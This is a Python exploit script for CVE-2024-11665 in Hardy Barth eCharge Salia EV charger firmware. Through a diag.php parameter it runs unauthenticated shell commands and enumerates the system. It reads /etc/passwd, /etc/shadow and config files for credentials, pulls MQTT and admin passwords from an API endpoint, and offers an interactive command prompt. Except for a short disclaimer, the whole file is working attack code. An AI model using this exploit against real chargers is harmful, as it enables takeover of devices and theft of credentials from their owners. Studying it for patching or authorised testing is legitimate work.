#!/usr/bin/env python3
"""
CVE-2024-11665 Exploit - Hardy Barth eCharge Salia RCE

This exploit targets the insecure PHP diagnostic script that allows
remote code execution without authentication.

Target: Hardy Barth eCharge Salia firmware <= 1.51.4
Impact: Full system compromise via command injection

Usage:
    python3 cve_2024_11665_hardy_barth_rce.py <target_ip> <port>
    python3 cve_2024_11665_hardy_barth_rce.py 192.168.1.100 8081

DISCLAIMER: For authorized security testing only.
"""

import argparse
import requests
import sys
from urllib.parse import quote

# Import attack reporter for live feed
try:
    from attack_reporter import report_attack, report_step, report_success, report_failure, report_command, report_data
    HAS_REPORTER = True
except ImportError:
    HAS_REPORTER = False
    def report_attack(*args, **kwargs): pass
    def report_step(*args, **kwargs): pass
    def report_success(*args, **kwargs): pass
    def report_failure(*args, **kwargs): pass
    def report_command(*args, **kwargs): pass
    def report_data(*args, **kwargs): pass


class HardyBarthExploit:
    def __init__(self, target: str, port: int):
        self.base_url = f"http://{target}:{port}"
        self.target_str = f"{target}:{port}"
        self.vulnerable_endpoint = "/cgi-bin/diag.php"
        
        # Report attack start
        report_attack(
            cve="CVE-2024-11665",
            name="Hardy Barth eCharge Salia RCE",
            severity="critical",
            target=self.target_str,
            attack_type="rce"
        )
        
    def check_vulnerable(self) -> bool:
        """Check if target is vulnerable"""
        print(f"[*] Checking target: {self.base_url}")
        report_step(f"Probing {self.base_url}{self.vulnerable_endpoint}")
        
        try:
            # Try to access the diagnostic endpoint
            resp = requests.get(f"{self.base_url}{self.vulnerable_endpoint}?cmd=echo%20VULNERABLE", timeout=10)
            if "VULNERABLE" in resp.text:
                print("[+] Target is VULNERABLE to CVE-2024-11665!")
                report_success("Target confirmed VULNERABLE - RCE possible via diag.php")
                return True
            else:
                print("[-] Target does not appear vulnerable")
                report_failure("Target not vulnerable - diag.php not exploitable")
                return False
        except requests.exceptions.RequestException as e:
            print(f"[-] Connection error: {e}")
            report_failure(f"Connection failed: {e}")
            return False
    
    def execute_command(self, command: str) -> str:
        """Execute arbitrary command on target"""
        print(f"[*] Executing: {command}")
        report_step(f"Executing command: {command}", severity="critical")
        
        try:
            encoded_cmd = quote(command)
            resp = requests.get(
                f"{self.base_url}{self.vulnerable_endpoint}?cmd={encoded_cmd}",
                timeout=30
            )
            # Extract output from HTML response
            output = resp.text
            if "<pre>" in output:
                start = output.find("<pre>") + 5
                end = output.find("</pre>")
                if end > start:
                    output = output[start:end].strip()
            
            # Report command execution
            report_command(command, output[:300] if output else "(no output)", success=True)
            return output
        except requests.exceptions.RequestException as e:
            report_command(command, str(e), success=False)
            return f"Error: {e}"
    
    def get_system_info(self):
        """Gather system information"""
        print("\n[*] Gathering system information...")
        report_step("Enumerating system information", severity="high")
        
        commands = [
            ("Hostname", "hostname"),
            ("User", "whoami"),
            ("OS", "uname -a"),
            ("IP Address", "hostname -I || ip addr show | grep inet"),
            ("Processes", "ps aux | head -10"),
        ]
        
        info = {}
        for name, cmd in commands:
            print(f"\n=== {name} ===")
            result = self.execute_command(cmd)
            print(result)
            info[name.lower()] = result
        
        report_data("system_info", info, "System enumeration complete")
    
    def get_credentials(self):
        """Attempt to extract credentials from config files"""
        print("\n[*] Searching for credentials...")
        report_step("Hunting for credentials in config files", severity="critical")
        
        # Common config locations
        files = [
            "/etc/passwd",
            "/etc/shadow",  # Usually requires root
            "/var/www/config.php",
            "/opt/charger/config.ini",
        ]
        
        for f in files:
            print(f"\n=== Checking {f} ===")
            result = self.execute_command(f"cat {f} 2>/dev/null || echo 'File not found'")
            if "File not found" not in result:
                print(result[:500])  # Limit output
                if "password" in result.lower() or "shadow" in f:
                    report_data("credentials", {"file": f, "content": result[:200]}, f"Found sensitive data in {f}")
    
    def interactive_shell(self):
        """Simple interactive command execution"""
        print("\n[*] Interactive mode (type 'exit' to quit)")
        print("[*] Note: This is not a real shell, just command execution")
        report_step("Entering interactive shell mode")
        
        while True:
            try:
                cmd = input("\n$ ").strip()
                if cmd.lower() in ['exit', 'quit', 'q']:
                    break
                if not cmd:
                    continue
                result = self.execute_command(cmd)
                print(result)
            except KeyboardInterrupt:
                break
        
        print("\n[*] Exiting...")
        report_step("Shell session ended")
    
    def exploit_mqtt_config(self):
        """
        CVE-2024-11666 - Extract MQTT credentials (SSL verification disabled)
        """
        print("\n[*] Extracting MQTT configuration (CVE-2024-11666)...")
        report_step("Exploiting CVE-2024-11666 - MQTT config extraction", severity="high")
        
        try:
            resp = requests.get(f"{self.base_url}/api/config", timeout=10)
            if resp.status_code == 200:
                config = resp.json()
                print("[+] Configuration extracted!")
                print(f"    MQTT Broker: {config.get('mqtt', {}).get('broker')}")
                print(f"    MQTT User: {config.get('mqtt', {}).get('username')}")
                print(f"    MQTT Pass: {config.get('mqtt', {}).get('password')}")
                print(f"    SSL Verify: {config.get('mqtt', {}).get('ssl_verify')}")
                print(f"    Admin User: {config.get('admin', {}).get('username')}")
                print(f"    Admin Pass: {config.get('admin', {}).get('password')}")
                
                report_data("mqtt_config", config.get('mqtt', {}), "MQTT credentials extracted!")
                report_data("admin_creds", config.get('admin', {}), "Admin credentials exposed!")
                return config
        except Exception as e:
            print(f"[-] Failed to get config: {e}")
            report_failure(f"Config extraction failed: {e}")
        return None


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2024-11665 - Hardy Barth eCharge Salia RCE Exploit"
    )
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("port", type=int, default=8081, nargs='?', help="Target port (default: 8081)")
    parser.add_argument("-c", "--command", help="Execute single command")
    parser.add_argument("-i", "--interactive", action="store_true", help="Interactive mode")
    parser.add_argument("--info", action="store_true", help="Gather system info")
    parser.add_argument("--creds", action="store_true", help="Search for credentials")
    parser.add_argument("--mqtt", action="store_true", help="Extract MQTT config (CVE-2024-11666)")
    
    args = parser.parse_args()
    
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║  CVE-2024-11665 - Hardy Barth eCharge Salia RCE Exploit  ║
    ║  + CVE-2024-11666 - MQTT SSL Verification Bypass          ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    exploit = HardyBarthExploit(args.target, args.port)
    
    if not exploit.check_vulnerable():
        sys.exit(1)
    
    if args.mqtt:
        exploit.exploit_mqtt_config()
    
    if args.command:
        result = exploit.execute_command(args.command)
        print(f"\n{result}")
    elif args.info:
        exploit.get_system_info()
    elif args.creds:
        exploit.get_credentials()
    elif args.interactive:
        exploit.interactive_shell()
    else:
        # Default: show info and start interactive
        exploit.exploit_mqtt_config()
        exploit.get_system_info()
        exploit.interactive_shell()


if __name__ == "__main__":
    main()
